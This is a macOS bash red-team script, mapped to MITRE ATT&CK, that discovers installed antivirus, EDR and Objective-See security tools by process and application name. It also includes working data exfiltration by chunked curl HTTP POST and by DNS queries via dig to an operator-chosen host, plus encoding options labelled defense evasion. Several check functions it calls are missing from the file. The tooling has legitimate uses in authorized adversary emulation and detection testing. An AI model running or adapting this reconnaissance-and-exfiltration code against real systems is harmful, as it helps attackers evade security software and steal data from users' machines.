

#Name: security_sofware.sh
# TTP: Security Software Discovery
# TTP ID: T1518.001
# Tactic: Discovery
# Platform: macOS
# Permissions Required: User
# Author: @darmado x.com/darmad0
# Date: 2024-09-23
# Version: 1.4

# Description: This script discovers security software installed on a macOS system,
# including antivirus, firewall, and other security tools. It checks for running
# proc, installed applications, and system configurations related to security
# software.
#
# Usage: ./security_software.sh [options]


# Note: This script is intended for educational and authorized testing purposes only.
# Ensure you have proper permissions before running on any system.

# Global variables
NAME="security_software"
TTP_ID="T1518.001"
TACTIC="Discovery"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
ALL=false
EDR=""
AV=""
MRT=""
FIREWALL=false
HIDS=false
GATEKEEPER=false
XPROTECT=false
TCC=false
SUDO_MODE=false
CHUNK_SIZE=1000  # Default chunk size

# MITRE ATT&CK Mappings
TACTIC="Discovery"
TTP_ID="T1518.001"

TACTIC_EXFIL="Exfiltration"
TTP_ID_EXFIL="T1041"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"

CMD_LS_APP_FILES='ls -laR /Applications/'
CMD_LS_APP_DIR='ls -d /Applications/'
CMD_PS='ps -axrww | grep -v grep| grep --color=always'
CMD_SP_APP='system_profiler SPApplicationsDataType | grep --color=always -A 8 '

CMD_LS_APP_FILES='ls -laR /Applications/'
CMD_LS_APP_DIR='ls -d /Applications/'
CMD_PS='ps -axrww | grep -v grep| grep --color=always'
CMD_SP_APP='system_profiler SPApplicationsDataType | grep --color=always -A 8 '

# Arrays to store checks
EDR=()
AV=()
MRT=()
OST=()


cmd_ls_app_files() {
    "$CMD_LS_APP_FILES""$1" 2>/dev/null
}

cmd_ls_app_dir() {
   "$CMD_LS_APP_DIR""$1" 2>/dev/null
}

#TODO: i dont like  this is eval, but it works for now
# We use eval because we're passing a variable that contains pipes
cmd_sp_app() {
    eval "$CMD_SP_APP '$1'"  2>&1
}

cmd_ps() {
    eval "$CMD_PS '$1'" 2>&1
}

# AV vendor data
AV_VENDOR_PROC=(
    "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
    "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
    "Avast:AvastUI"
    "AvastBusinessAntivirusforMac:AvastBusinessUI"
    "AvastFreeAntivirusforMac:AvastFreeUI"
    "AvastSecurity:AvastSecurityUI"
    "Avira:AviraUI"
    "AviraAntivirus:AviraAntivirusUI"
    "AviraFreeAntivirusforMac:AviraFreeUI"
    "Bitdefender:bdmd"
    "BitdefenderAntivirusforMac:bdmd"
    "BitdefenderAntivirusFree:bdmd"
    "BitdefenderGravityZone:bdmd"
    "ESET:ec_service"
    "ESETCyberSecurityforMac:ec_service"
    "ESETNOD32:ESETNOD32Service"
   # "F-Secure:F-Secure\ Service" ##TODO: Buggy due to spaces in the name
    "F-SecureElements:FSElementsService"
    "Kaspersky:kavsvc"
    "KasperskyFreeAntivirusforMac:kavsvc"
    "KasperskySecurityCloud:kavsvc"
    "MicrosoftDefender:Defender"
    "Norton360:Norton360Service"
    "PandaAdaptiveDefense:PandaAdaptiveService"
    "PandaSecurity:PandaService"
    "Proofpoint:ProofpointAgent"
    "Webroot:WRSAService"
    "WebrootBusinessEndpointProtection:WRBusinessService"
    "WebrootSecureAnywhere:WRSAService"
)

AV_VENDOR_APP=(
    "MacKeeper.app"
    "Avast.app"
    "AvastBusiness.app"
    "AvastFree.app"
    "AvastSecurity.app"
    "Avira.app"
    "AviraAntivirus.app"
    "AviraFree.app"
    "Bitdefender.app"
    "BitdefenderMac.app"
    "BitdefenderFree.app"
    "GravityZone.app"
    "ESET.app"
    "CyberSecurity.app"
    "NOD32.app"
    "F-Secure.app"
    "Elements.app"
    "Kaspersky.app"
    "KasperskyFree.app"
    "SecurityCloud.app"
    "Microsoft Defender.app"
    "Norton360.app"
    "PandaAdaptive.app"
    "Panda.app"
    "Proofpoint.app"
    "Webroot.app"
    "WebrootBusiness.app"
    "WebrootSecureAnywhere.app"
    "Malwarebytes.app"
)

# EDR vendor data
EDR_VENDOR_PROC=(
    "CrowdStrike:falconctl,falcon-sensor"
    "CarbonBlack:cbdaemon,cbagent"
    "SentinelOne:SentinelAgent,SentinelService"
    "Cylance:CylanceSvc,CylanceUI"
    "FireEye:FireEyeAgent,FireEyeService"
    "CiscoAMP:ampdaemon,ampservice"
    "PaloAlto:CortexService,TrapsService"
    "MicrosoftDefender:mds,mdatp"
    "TrendMicroApexOne:ds_agent,tmlisten"
    "SophosInterceptX:sophosd,sophosservice"
    "McAfee:mcafeeagent,mcafeed"
)

EDR_VENDOR_APP=(
    "CrowdStrike.app"
    "CarbonBlack.app"
    "SentinelOne.app"
    "Cylance.app"
    "FireEye.app"
    "CiscoAMP.app"
    "Cortex XDR.app"
    "Microsoft Defender.app"
    "TrendMicroSecurity.app"
    "Sophos_Endpoint.app"
    "McAfee _ndpoint Security for Mac.app"
)

# Objective-See and additional macOS security tools
OST_PROC=(
    "BlockBlock:blockblock"
    "DoNotDisturb:DoNotDisturb"
    "LuLu:LuLu"
    "KnockKnock:KnockKnockDaemon"
    "OverSight:OverSight"
    "RansomWhere:RansomWhere"
)

OST_APP=(
    "BlockBlock.app"
    "DoNotDisturb.app"
    "LuLu.app"
    "KnockKnock.app"
    "OverSight.app"
    "RansomWhere.app"
)


display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Description:"
    echo "  Discovers security software on macOS using native tools (T1518.001)."
    echo ""
    echo "Options:"
    echo "  General:"
    echo "    --help                 Show this help message"
    echo "    --verbose              Enable detailed output"
    echo "    --log                  Log output to file (rotates at 5MB)"
    echo "    --all                  Run all checks"
    echo ""
    echo "  EDR/AV:"
    echo "    --edr=OPTION           Check EDR (ps|files|dir|info) using ps, ls, system_profiler"
    echo "    --av=OPTION            Check antivirus (ps|files|dir|info) using ps, ls, system_profiler"
    echo ""
    echo "  Open Source Tools:"
    echo "    --ost=OPTION           Check Objective-See tools (ps|files|info) using ps, ls, system_profiler"
    echo ""
    echo "  System Security:"
    echo "    --fw                   Check Application Firewall using socketfilterfw"
    echo "    --hids                 Check for HIDS using ls, ps"
    echo "    --xp                   Check XProtect using system_profiler, ls"
    echo "    --mrt=OPTION           Check MRT (ps|files|config) using ps, ls, defaults"
    echo "    --gk                   Check Gatekeeper using spctl"
    echo "    --tcc                  Check TCC using tccutil"
    echo ""
    echo "  Output Processing:"
    echo "    --encode=TYPE          Encode output (b64|hex) using base64 or xxd"
    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
    echo ""
    echo "  Data Exfiltration:"
    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig (RFC 1035)"
    echo "    --chunksize=SIZE       Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)"
    echo "                           Note: DNS exfiltration uses fixed 63-byte chunks per RFC 1035"
}

get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

log_to_stdout() {
    local msg="$1"
    local function_name="$2"
    local command="$3"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
    
    echo "$log_entry"
    
    if [ "$LOG_ENABLED" = true ]; then
        echo "$log_entry" >> "$LOG_FILE"
    fi
}

check_av() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "ps")
            log_to_stdout "Checked antivirus processes" "check_av" "$CMD_PS"
            for entry in "${AV_VENDOR_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    result=$(cmd_ps "$proc")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                done
            done
            ;;
        "files")
            log_to_stdout "Checked antivirus files" "check_av" "$CMD_LS_APP_FILES"
            for app_name in "${AV_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_files "$app_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "dir")
            log_to_stdout "Checked antivirus directories" "check_av" "$CMD_LS_APP_DIR"
            for app_name in "${AV_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_dir "$app_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "info")
            log_to_stdout "Checked antivirus info" "check_av" "$CMD_SP_APP"
            for app_name in "${AV_VENDOR_APP[@]}"; do
                if app_path=$(cmd_ls_app_dir "$app_name"); then
                    app_name_colon="${app_name/.app/:}"
                    result=$(cmd_sp_app "$app_name_colon")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                fi
            done
            ;;
        *)
            output+="Unknown check type: $check_type\n"
            ;;
    esac

    echo "$output"
}

check_edr() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "ps")
            log_to_stdout "Checked EDR processes" "check_edr" "$CMD_PS"
            for entry in "${EDR_VENDOR_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    result=$(cmd_ps "$proc")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                done
            done
            ;;
        "files")
            log_to_stdout "Checked EDR files" "check_edr" "$CMD_LS_APP_FILES"
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_files "$edr_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "dir")
            log_to_stdout "Checked EDR directories" "check_edr" "$CMD_LS_APP_DIR"
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                result=$(cmd_ls_app_dir "$edr_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "info")
            log_to_stdout "Checked EDR info" "check_edr" "$CMD_SP_APP"
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                    edr_name_colon="${edr_name/.app/:}"
                    result=$(cmd_sp_app "$edr_name_colon")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

check_ost() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "ps")
            log_to_stdout "Checked OST processes" "check_ost" "$CMD_PS"
            for entry in "${OST_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    result=$(cmd_ps "$proc")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                done
            done
            ;;
        "files")
            log_to_stdout "Checked OST files" "check_ost" "$CMD_LS_APP_FILES"
            for ost_name in "${OST_APP[@]}"; do
                result=$(cmd_ls_app_files "$ost_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "dir")
            log_to_stdout "Checked OST directories" "check_ost" "$CMD_LS_APP_DIR"
            for ost_name in "${OST_APP[@]}"; do
                result=$(cmd_ls_app_dir "$ost_name")
                if [ -n "$result" ]; then
                    output+="$result"$'\n'
                fi
            done
            ;;
        "info")
            log_to_stdout "Checking OST info" "check_ost" "$CMD_SP_APP"
            
            for ost_name in "${OST_APP[@]}"; do
                if cmd_ls_app_dir "$ost_name" > /dev/null 2>&1; then
                    ost_name_colon="${ost_name/.app/:}"
                    result=$(cmd_sp_app "$ost_name_colon")
                    if [ -n "$result" ]; then
                        output+="$result"$'\n'
                    fi
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

# Encoding function
encode_output() {
    local data="$1"
    local original_ttp_id=$TTP_ID
    local original_tactic=$TACTIC

    case $ENCODE in
        b64)
            TTP_ID=$TTP_ID_ENCODE_BASE64
            TACTIC=$TACTIC_ENCODE
            log_to_stdout "Encoded output using Base64" "encode_output" "base64"
            echo "$output" | base64
            ;;
        hex)
            TTP_ID=$TTP_ID_ENCODE
            TACTIC=$TACTIC_ENCODE
            log_to_stdout "Encoded output using Hex" "encode_output" "xxd -p"
            echo "$output" | xxd -p
            ;;
        perl_b64)
            TTP_ID=$TTP_ID_ENCODE_PERL
            TACTIC="Execution"
            log_to_stdout "Encoded output using Perl Base64" "encode_output" "perl -MMIME::Base64 -e 'print encode_base64(\"$output\");'"
            perl -MMIME::Base64 -e "print encode_base64(\"$output\");"
            ;;
        perl_utf8)
            TTP_ID=$TTP_ID_ENCODE_PERL
            TACTIC="Execution"
            log_to_stdout "Encoded output using Perl UTF-8" "encode_output" "perl -e 'print \"$output\".encode(\"UTF-8\");'"
            perl -e "print \"$output\".encode(\"UTF-8\");"
            ;;
        *)
            echo "Unknown encoding type: $ENCODE" >&2
            return 1
            ;;
    esac

    TTP_ID=$original_ttp_id
    TACTIC=$original_tactic
}

validate_dns() {
    local domain="$1"
    if host "$domain" > /dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

chunk_data() {
    local data="$1"
    local chunk_size="$2"
    local output=""
    
    while [ -n "$data" ]; do
        output+="${data:0:$chunk_size}"$'\n'
        data="${data:$chunk_size}"
    done
    
    echo "$output"
}

exfiltrate_http() {
    local data="$1"
    local url="$2"
    local og_ttp="$TTP_ID"
    TTP_ID="$TTP_ID_EXFIL"

    log_to_stdout "Starting HTTP exfil" "exfil_http" "curl $url"
    
    local chunks=$(chunk_data "$data" "$CHUNK_SIZE")
    local total=$(echo "$chunks" | wc -l)
    local count=1

    echo "$chunks" | while IFS= read -r chunk; do
        local size=${#chunk}
        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfil_http" "curl $url"
        
        if curl -L -s -X POST -d "$chunk" "$url" --insecure -o /dev/null -w "%{http_code}" | grep -q "^2"; then
            log_to_stdout "Chunk $count/$total sent" "exfil_http" "curl $url"
        else
            log_to_stdout "Chunk $count/$total failed" "exfil_http" "curl $url"
            TTP_ID="$og_ttp"
            return 1
        fi
        count=$((count + 1))
    done

    log_to_stdout "HTTP exfil complete" "exfil_http" "curl $url"
    TTP_ID="$og_ttp"
    return 0
}

exfiltrate_dns() {
    local data="$1"
    local domain="$2"
    local id="$3"
    local original_ttp_id=$TTP_ID
    TTP_ID=$TTP_ID_EXFIL

    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local dns_chunk_size=63  # Fixed max length of a DNS label

    log_to_stdout "Attempting to exfiltrate data via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"

    # Send the ID first
    if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
        log_to_stdout "Failed to send ID via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
        TTP_ID=$original_ttp_id
        return 1
    fi

    local chunks=$(chunk_data "$encoded_data" "$dns_chunk_size")
    local total_chunks=$(echo "$chunks" | wc -l)
    local chunk_num=0

    echo "$chunks" | while IFS= read -r chunk; do
        if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
        else
            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
            TTP_ID=$original_ttp_id
            return 1
        fi
        chunk_num=$((chunk_num+1))
    done

    if dig +short "end.$domain" A > /dev/null; then
        log_to_stdout "Successfully completed DNS exfiltration" "exfiltrate_dns" "dig +short end.$domain"
        TTP_ID=$original_ttp_id
        return 0
    else
        log_to_stdout "Failed to send end signal via DNS" "exfiltrate_dns" "dig +short end.$domain"
        TTP_ID=$original_ttp_id
        return 1
    fi
}

#TODO: I comletely forgot about this function and it needs to be tested.
setup_log() {
    local script_name=$(basename "$0" .sh)
    touch "$LOG_FILE"
}

log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        setup_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        setup_log
    fi
}

#log output
log_and_append() {
    local result="$1"
    
    # Only log if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        echo "$result" >> "$LOG_FILE"
    fi
}



# Argument parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        --help) display_help; exit 0 ;;
        --verbose) VERBOSE=true ;;
        --log) LOG_ENABLED=true ;;
        --all) ALL=true ;;
        --edr=*) EDR="${1#*=}" ;;
        --fw) FIREWALL=true ;;
        --hids) HIDS=true ;;
        --av=*) AV+=("${1#*=}") ;;
        --gk) GATEKEEPER=true ;;
        --xp) XPROTECT=true ;;
        --mrt=*) MRT="${1#*=}" ;;
        --tcc) TCC=true ;;
        --ost=*) OST+=("${1#*=}") ;;
        --encode=*) ENCODE="${1#*=}" ;;
        --encrypt=*) ENCRYPT="${1#*=}"; ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/') ;;
        --exfil=*) 
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_URI="${EXFIL_METHOD#dns=}"
            else
                EXFIL_URI="$EXFIL_METHOD"
            fi
            ;;
        --chunksize=*)
            CHUNK_SIZE="${1#*=}"
            # Ensure chunk size is within acceptable limits (e.g., 100 to 10000 bytes)
            if [ "$CHUNK_SIZE" -lt 100 ] || [ "$CHUNK_SIZE" -gt 10000 ]; then
                echo "Error: Chunk size must be between 100 and 10000 bytes" >&2
                exit 1
            fi
            ;;
        --sudo) SUDO_MODE=true ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

main() {
    local output=""
    local encoded_output=""
    if [ "$LOG_ENABLED" = true ]; then
        setup_log
    fi

    # Validate DNS early if exfiltration is requested
    if [ "$EXFIL" = true ]; then
        local domain
        if [[ "$EXFIL_METHOD" == http://* ]]; then
            domain=$(echo "$EXFIL_METHOD" | awk -F[/:] '{print $4}')
        elif [[ "$EXFIL_METHOD" == dns=* ]]; then
            domain="${EXFIL_METHOD#dns=}"
        else
            log_to_stdout "Unknown exfiltration method: $EXFIL_METHOD" "main" "validate_dns"
            exit 1
        fi

        if ! validate_dns "$domain"; then
            log_to_stdout "DNS resolution failed for $domain, exiting" "main" "validate_dns"
            exit 1
        fi
    fi

    # Run TTPs only if DNS validation passed or exfiltration is not requested
    if [ "$ALL" = true ] || [ -n "${EDR[*]}" ] || [ ${#AV[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
       [ -n "${MRT[*]}" ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
       [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ] || [ "$LOG_ENABLED" = true ]; then
        
        for av_tool in "${AV[@]}"; do
            result=$(check_av "$av_tool")
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        done

        for ost_tool in "${OST[@]}"; do
            result=$(check_ost "$ost_tool")
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        done

        for edr_tool in "${EDR[@]}"; do
            result=$(check_edr "$edr_tool")
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        done

        if [ "$FIREWALL" = true ]; then
            result=$(check_firewall)
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        fi

        for mrt_tool in "${MRT[@]}"; do
            result=$(check_mrt "$mrt_tool")
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        done

        if [ "$GATEKEEPER" = true ]; then
            result=$(check_gatekeeper)
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        fi

        if [ "$XPROTECT" = true ]; then
            result=$(check_xprotect)
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        fi

        if [ "$TCC" = true ]; then
            result=$(check_tcc)
            output+="$result"$'\n'
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
        fi
    else
        display_help
        exit 0
    fi

    if [ -n "$output" ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            echo "$encoded_output"
            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$encoded_output" >> "$LOG_FILE"
        else
            echo "$output"
        fi

        if [ "$EXFIL" = true ]; then
            local exfil_data=$([ "$ENCODE" != "none" ] && echo "$encoded_output" || echo "$output")
            local b64_output=$(echo "$exfil_data" | base64)
            if [[ "$EXFIL_METHOD" == http://* ]]; then
                exfiltrate_http "$b64_output" "$EXFIL_METHOD"
            elif [[ "$EXFIL_METHOD" == dns=* ]]; then
                local domain="${EXFIL_METHOD#dns=}"
                exfiltrate_dns "$b64_output" "$domain" "$(date +%s)"
            fi
        fi
    else
        echo "No security software information found"
    fi
}

main
